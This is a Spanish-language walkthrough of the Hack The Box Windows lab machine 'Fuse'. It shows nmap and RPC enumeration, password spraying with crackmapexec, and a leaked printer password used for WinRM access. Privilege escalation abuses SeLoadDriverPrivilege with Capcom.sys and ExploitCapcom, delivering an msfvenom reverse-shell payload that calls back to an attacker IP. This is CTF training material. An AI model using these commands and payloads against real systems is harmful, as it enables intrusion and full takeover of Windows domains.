---
layout: single
title: Fuse- Hack The Box
excerpt: "Fuse es una máquina Windows de dificultad media en la cual, encontraremos en la página web un par de usuario y la contraseña que es el nombre de uno de los documentos. Posteriormente debemos cambiar esta contraseña y rápidamente logearnos en rpcclient para que con el comando enumprinters encontremos una contraseña y con crackmapexec podamos encontramos el usuario asociado a esta contraseña. Para la fase de escalamiento de privilegios vamos a aprovecharnos del privilegio SeLoadDriverPrivilege para tener shell como administrador."
date: 2020-xx-xx
classes: wide
header:
  teaser: /assets/images/hack-the-box/fuse_logo.png
  teaser_home_page: true
  icon: /assets/images/hack-the-box/hackthebox.webp
categories:
  - Hack-The-Box
  - Pentesting
tags:
  - SMB
  - RPC
  - Password spray
  - SeLoadDriverPrivilege
  - Capcom.sys	
---

<p align="center">
<img src="/assets/images/hack-the-box/fuse_logo.png">
</p>




Fuse es una máquina Windows de dificultad media en la cual, encontraremos en la página web un par de usuario y la contraseña que es el nombre de uno de los documentos. Posteriormente debemos cambiar esta contraseña y rápidamente logearnos en `rpcclient` para que con el comando `enumprinters` encontremos una contraseña y con `crackmapexec` podamos encontramos el usuario asociado a esta contraseña. Para la fase de escalamiento de privilegios vamos a aprovecharnos del privilegio `SeLoadDriverPrivilege` para tener shell como administrador.


## Reconocimiento y Enumeración

### Ping

Para un acceso más rápido, agregamos la dirección IP de la máquina al archivo `/etc/hosts` de la siguiente forma:

```console
10.10.10.193    fuse.htb
```

Luego, se debe revisar que la máquina esté activa. Hacemos un ping usando el siguiente comando:

```
ping -c 4 fuse.htb
```

- `-c <n>` = realizar *n* veces el ping

### Nmap

Se procede a realizar un escaneo de todos los puertos con la herramienta nmap usando el siguiente comando:

```console
nmap -p- --open -T5 -v -n fuse.htb -oG all-ports
```

- `-p-:` escanea todos los 65536 puertos
- `--open:` solo se va a tener en cuenta los puertos abiertos
- `-T5:` establece la plantilla de temporización, el rango es entre 0-5 y por lo tanto, el escaneo va a ir a una mayor velocidad
- `-v:` cuando nmap descubre un puerto, lo imprime por consola
- `-n:` se desactiva la resolución de DNS
- `-oG:` el archivo se va a guardar en formato grepable 

El output de nmap es el siguiente:

```console
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Fuse]           
└──╼ $nmap -p- --open -T5 -v -n fuse.htb -oG all-ports                
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-19 11:53 EDT

PORT      STATE SERVICE                                                           
53/tcp    open  domain                         
80/tcp    open  http                            
88/tcp    open  kerberos-sec                         
135/tcp   open  msrpc                          
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
```

Una vez se sabe qué puertos están abiertos en la máquina objetivo se procede a revisar las versiones de los servicios usando el comando:

```
nmap -sC -sV -p53,80,88,135,139,389,445 fuse.htb -oN targeted.txt
```

- `-sC:`  realiza un escaneo usando los scripts por defecto que se encuentran en la base de datos de nmap.
- `-sV:` intenta encontrar la versión del servicio que está corriendo en el puerto correspondiente.
- `-p:` se establece los puertos que deseo hacer el escaneo.
- `-oN:` el archivo se va a guardar en un formato normal, en este caso en formato de texto.

El output de nmap es el siguiente:

```console
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Fuse]
└──╼ #nmap -sC -sV -p53,80,88,135,139,389,445 fuse.htb -oN targeted.txt                                                                
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-20 11:20 -05

PORT    STATE SERVICE      VERSION        
53/tcp  open  domain?                       
| fingerprint-strings:                             
|   DNSVersionBindReqTCP:                       
|     version                            
|_    bind                                       
80/tcp  open  http         Microsoft IIS httpd 10.0                                  
| http-methods:               
|_  Potentially risky methods: TRACE                        
|_http-server-header: Microsoft-IIS/10.0            
|_http-title: Site doesn't have a title (text/html).       
88/tcp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-06-20 16:34:26Z)                                              
135/tcp open  msrpc        Microsoft Windows RPC              
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)            
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)                       
Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h34m13s, deviation: 4h02m30s, median: 14m12s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Fuse
|   NetBIOS computer name: FUSE\x00
|   Domain name: fabricorp.local
|   Forest name: fabricorp.local
|   FQDN: Fuse.fabricorp.local
|_  System time: 2020-06-20T09:36:51-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported 
|_  message_signing: required
```

Algunos de los puertos que están abiertos corresponde a los siguientes servicios:

- `Puerto 53 (DNS Domain Name Service):` sirve para la asignación de nombres de dominio a direcciones IP.

- `Puerto 80 (HTTP):` se utiliza para la navegación web de forma no segura.

- `Puerto 88 (Kerberos):` sirve para centralizar la autenticación de usuarios y equipos en una red.

- `Puerto 135 (msrpc):` permite acceso a los servicios y aplicaciones de Microsoft a través de la red.

- `Puerto 139 (NetBios):` permite a los hosts en una red LAN comunicarse con el hardware de la red y transmitir datos a través de la red.

- `Puerto 389 (LDAP):` protocolo de acceso ligero a directorios

- `Puerto 445 (SMB):` compartir archivos a través de una red TCP/IP Windows.

  

### Enumeración HTTP

Entramos al sitio web y nos encontramos con el siguiente error.

<p align="center">
<img src="/assets/images/hack-the-box/fuse/error-http.png">
</p>

En el output del nmap encontramos que el `FQDN`, es decir, el [nombre de dominio completo](https://linube.com/blog/fqdn-que-es/) que se refiere a la dirección completa y única de una página en internet. Consiste en el nombre de host y el dominio, y se utiliza para localizar hosts específicos en línea y acceder a ellos mediante la resolución de nombres.

Por lo anterior, debemos agregar el `FQDN` en el archivo `/etc/hosts` o simplemente recargara la página.

```console
10.10.10.193    fuse.fabricorp.local
```

Una vez ingresamos al sitio, encontramos que se trata de `PaperCut™ Print Logger` que es un programa gratuito de registro de impresiones. En la siguiente imagen vemos que hay unos hipervínculos para acceder a la información de las impresiones.

<p align="center">
<img src="/assets/images/hack-the-box/fuse/index-page.png">
</p>

Abrimos los 3 links ya sea en HTML o Excel y encontramos que en la segunda columna hay unos nombres de usuarios

<p align="center">
<img src="/assets/images/hack-the-box/fuse/users-1.png">
</p>

<p align="center">
<img src="/assets/images/hack-the-box/fuse/users-2.png">
</p>

<p align="center">
<img src="/assets/images/hack-the-box/fuse/users-3.png">
</p>

Creamos una lista con estos usuarios.

```
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Fuse]
└──╼ #cat usuarios 
pmerton
tlavel
sthompson
bhult
administrator
```

Ahora vamos a crear un diccionario con `cewl` con la información que hay en la página, ya que ni `smb` ni `rpc` nos deja logearnos de manera anónima.

```
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Fuse]
└──╼ #cewl -m 7 -w wordlist http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers -w diccionario.txt
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```



### Enumeración SMB

Usando la herramienta `crackmapexec` que nos permite realizar un ataque de [password spraying](https://doubleoctopus.com/security-wiki/threats-and-tools/password-spraying/#:~:text=Password%20spraying%20is%20an%20attack,account%20by%20guessing%20the%20password.) que básicamente intenta acceder a varias cuentas con muy pocas contraseñas, en este caso, con el diccionario que creamos anteriormente, vamos a revisar si la contraseña de algunos de los usuarios se encuentra en el diccionario, para esto, vamos a ejecutar el siguiente comando:

```
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Fuse]
└──╼ #crackmapexec smb 10.10.10.193 -u usuarios -p diccionario.txt

SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 (name:FUSE) (domain:fabricorp.local) (signin
g:True) (SMBv1:True)
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE 
SMB        10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE 
```

Observamos que la contraseña del usuario `tlavel` y `bhult`  es `Fabricorp01`, sin embargo, se debe cambiar esta. Así que vamos a utilizar el comando [smbpasswd](https://www.samba.org/samba/docs/current/man-html/smbpasswd.8.html) para cambiar la contraseña de SMB de alguno de estos usuarios. 

```
┌─[root@parrot]─[/home/nicolasmira101]
└──╼ #smbpasswd -U tlavel -r 10.10.10.193                          
Old SMB password:                                                    
New SMB password:                                                    
Retype new SMB password:                                             
Password changed for user tlavel on 10.10.10.193.                  
```



### Enumeración RPC

Rápidamente ingresamos con el usuario y la contraseña que hayamos asignado a ese, al servicio `rpcclient`, ya que la contraseña se resetea después de aproximadamente 20 segundos.

```
┌─[root@parrot]─[/home/nicolasmira101]                             
└──╼ #rpcclient -U tlavel 10.10.10.193                           
Enter WORKGROUP\bnielson's password:
rpcclient $>                
```

Primero, enumeramos los usuarios y encontramos algunos más, así que los vamos a agregar a nuestra lista  de usuarios

```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[svc-print] rid:[0x450]
user:[bnielson] rid:[0x451]
user:[sthompson] rid:[0x641]
user:[tlavel] rid:[0x642]
user:[pmerton] rid:[0x643]
user:[svc-scan] rid:[0x645]
user:[bhult] rid:[0x1bbd]
user:[dandrews] rid:[0x1bbe]
user:[mberbatov] rid:[0x1db1]
user:[astein] rid:[0x1db2]
user:[dmuir] rid:[0x1db3]
```

Como vimos en la página web, se trata del software `PaperCut™ Print Logger` que es un programa gratuito de registro de impresiones, así que vamos a revisar con el comando `help` qué comandos existen que estén relacionados con `printers`.

```
---------------         ----------------------                     
        SPOOLSS                  
      adddriver         Add a print driver                         
     addprinter         Add a printer                              
      deldriver         Delete a printer driver                    
    deldriverex         Delete a printer driver with files              
      enumports         Enumerate printer ports                    
    enumdrivers         Enumerate installed printer drivers        
   enumprinters         Enumerate printers                         
        getdata         Get print driver data                      
      getdataex         Get printer driver data with keyname                 
   getdriverdir         Get print driver upload directory     
```

El comando que más nos interesa, es `enumprinters` que nos permite enumerar impresoras, así que escribimos ese comando y nos arroja lo siguiente:

```
rpcclient $> enumprinters
        flags:[0x800000]
        name:[\\10.10.10.193\HP-MFT01]
        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
        comment:[]
```



### Enumeración winrm

Ahora, nuevamente con `crackmapexec` vamos a revisar si alguno de los usuarios tiene la contraseña que encontramos con el comando `enumprinters`, pero en este caso, no vamos a revisar SMB sino `winrm` para poder obtener shell como usuario

```
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Fuse]
└──╼ #crackmapexec winrm 10.10.10.193 -u svc-print -p '$fab@s3Rv1ce$1'
WINRM       10.10.10.193    5985   FUSE             [*] http://10.10.10.193:5985/wsman
WINRM       10.10.10.193    5985   FUSE             [+] FABRICORP\svc-print:$fab@s3Rv1ce$1 (Pwn3d!)
```




## Shell de usuario

El usuario que tiene estas credenciales es `svc-print`, así que usando `evil-winrm` vamos a conectarnos.

```
┌─[root@parrot]─[/home/nicolasmira101]
└──╼ #evil-winrm -i 10.10.10.193 -u svc-print -p '$fab@s3Rv1ce$1'   

Evil-WinRM shell v2.3                                                                                         
Info: Establishing connection to remote endpoint                                                                                     
*Evil-WinRM* PS C:\Users\svc-print\Documents> type ../user.txt
3d4719...........................
```




## Escalamiento de privilegios

Vamos a revisar qué privilegios tiene este usuario

```
*Evil-WinRM* PS C:\Users\svc-print\Documents> whoami /priv                                                                                         
PRIVILEGES INFORMATION                 
----------------------                                                                             
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeLoadDriverPrivilege         Load and unload device drivers Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Revisando acerca del privilegio `SeLoadDriverPrivilege` encontramos el siguiente [artículo](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/) que nos dice cómo abusar de este privilegio para escalar privilegios.

Antes de seguir el paso a paso del artículo anterior para escalar privilegios, vamos a crear un payload que contiene el código de la shell que vamos a cargar en la máquina de la víctima.

```
┌─[root@parrot]─[/home/nicolasmira101]
└──╼ #msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.26 LPORT=4444 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
```

Ahora sí, vamos a seguir el tutorial del artículo para abusar del privilegio `SeLoadDriverPrivilege` y lo primero que debemos hacer es descargar el siguiente archivo [eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp) , compilarlo y generar un ejecutable.

 Luego, debemos descargar el siguiente proyecto [ExploitCapcom](https://github.com/tandasat/ExploitCapcom/tree/master/ExploitCapcom/ExploitCapcom) que se encuentra desarrollo en Visual Studio. Para que no genere problemas al compilar y generar el ejecutable, recomiendo utilizar [Visual Studio 2019 Community](https://visualstudio.microsoft.com/vs/community/) 

Del archivo `ExploitCapcom.cpp` debemos cambiar la ubicación del comando de la línea 292 por la dirección donde hayamos el payload que creamos anteriormente con `msfvenom`.

```c++
TCHAR CommandLine[] = TEXT("C:\\Users\\svc-print\\Documents\\shell.exe"); 
```

Una vez cambiemos la la línea 292 del archivo `ExploitCapcom.cpp` debemos compilar y generar un ejecutable.

Finalmente, debemos descargar el siguiente archivo [Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) que contiene la configuración de este controlador de dispositivo.

Ahora, vamos a cargar, con evil-winrm, el ejecutable generar del archivo eoploaddriver.cpp, del ExploitCapcom, la shell creada con msfvenom y el archivo capcom.sys.

```
*Evil-WinRM* PS C:\Users\svc-print\Documents> upload loaddriver.exe
Info: Uploading loaddriver.exe to C:\Users\svc-print\Documents\loaddriver.exe         
Data: 15700 bytes of 15700 bytes copied             
Info: Upload successful!                                                             

*Evil-WinRM* PS C:\Users\svc-print\Documents> upload exploitcapcom.exe
Info: Uploading exploitcapcom.exe to C:\Users\svc-print\Documents\exploitcapcom.exe
Data: 18650 bytes of 18650 bytes copied             
Info: Upload successful!     

*Evil-WinRM* PS C:\Users\svc-print\Documents> upload Capcom.sys
Info: Uploading Capcom.sys to C:\Users\svc-print\Documents\Capcom.sys
Data: 14100 bytes of 14100 bytes copied
Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-print\Documents> upload shell.exe
Info: Uploading shell.exe to C:\Users\svc-print\Documents\shell.exe
Data: 9556 bytes of 9556 bytes copied
Info: Upload successful!
```

Ya tenemos todo listo para abusar de este privilegio y realizar nuestra explotación. Lo primero que debemos hacer, es ejecutar el archivo `loaddriver.exe` como nos indica este [repositorio](https://github.com/TarlogicSecurity/EoPLoadDriver).

```
*Evil-WinRM* PS C:\Users\svc-print\Documents> .\loaddriver.exe System\CurrentControlSet\MyService  C:\Users\svc-print\Documents\Capcom.sys
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled 
[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService 
NTSTATUS: 00000000, WinError: 0
```

Ahora, vamos a iniciar un [listener](https://metasploit.help.rapid7.com/docs/listeners) con Metasploit

```
┌─[root@parrot]─[/home/nicolasmira101]                                    
└──╼ #msfconsole  

       =[ metasploit v5.0.90-dev                          ]
+ -- --=[ 2019 exploits - 1099 auxiliary - 343 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf5 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.26:4444 
```

Procedemos a ejecutar el archivo `exploitcapcom.exe`

```
*Evil-WinRM* PS C:\Users\svc-print\Documents> .\exploitcapcom.exe
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 000002B6CF0B0008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
[*] Press any key to exit this program
```

Revisando la consola de Metasploit, ya tenemos una sesión con meterpreter.

```
msf5 exploit(multi/handler) > [*] Sending stage (201283 bytes) to 10.10.10.193
[*] Meterpreter session 1 opened (10.10.14.26:4444 -> 10.10.10.193:52020) at 2020-06-18 00:21:01 -0500
```

Por último, debemos crear una shell con meterpreter y de esta forma, obtener la flag del administrador.

```
meterpreter > shell
Process 576 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

python3 -c 'import pty;pty.spawn("/bin/bash")'

C:\Users\svc-print\Documents>whoami
whoami
nt authority\system

C:\Users\svc-print\Documents>type C:\Users\Administrator\Desktop\root.txt
type root.txt
d78b1..........................
```